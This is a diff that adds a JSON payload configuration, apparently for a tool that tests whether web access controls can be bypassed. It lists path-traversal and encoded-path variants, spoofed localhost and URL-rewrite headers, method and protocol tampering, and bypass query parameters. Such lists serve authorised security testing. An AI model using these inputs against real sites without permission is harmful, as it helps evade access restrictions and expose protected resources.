@@ -1,0 +1,43 @@
+{
+  "methods": ["GET", "POST", "PUT","TRACE", "OPTIONS"],
+  "contentLength": [
+    {"Content-Length": "0"},
+    {"Content-Length": "5"},
+    {"Content-Length": "{{dynamic}}"}
+  ],
+  "userAgents": [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (X11; Linux x86_64)",
+    "curl/7.68.0"
+  ],
+  "paths": [
+    "{{baseURL}}/",
+    "{{baseURL}}//",
+    "{{baseURL}}/%2e/%2e",
+    ".{{baseURL}}",
+    "%2f%2e/{{baseURL}}",
+    "{{baseURL}}/;%20/",
+    "{{baseURL}}/../",
+    "{{baseURL}}//.%2e/",
+    "%2f%2e/{{baseURL}}%2f%2e/"
+  ],
+  "headers": [
+    {"X-Original-URL": "{{baseURL}}"},
+    {"X-Rewrite-URL": "{{baseURL}}"},
+    {"Base-Url": "127.0.0.1"},
+    {"Client-IP": "127.0.0.1"},
+    {"Forwarded": "for=127.0.0.1"},
+    {"Via": "1.1 proxy"}
+  ],
+  "extensionInjection": [
+    ".php",
+    ".js",
+    ".html",
+    ".khtml",
+    ".xhtml"
+  ],
+  "protocols": ["HTTP/1.1", "HTTP/1.0", "HTTP/0.9"],
+  "queryParams": ["?debug=true", "?bypass=1", "?%63md=1"],
+  "payloads": ["", "a=1", "long-string-value"]
+}
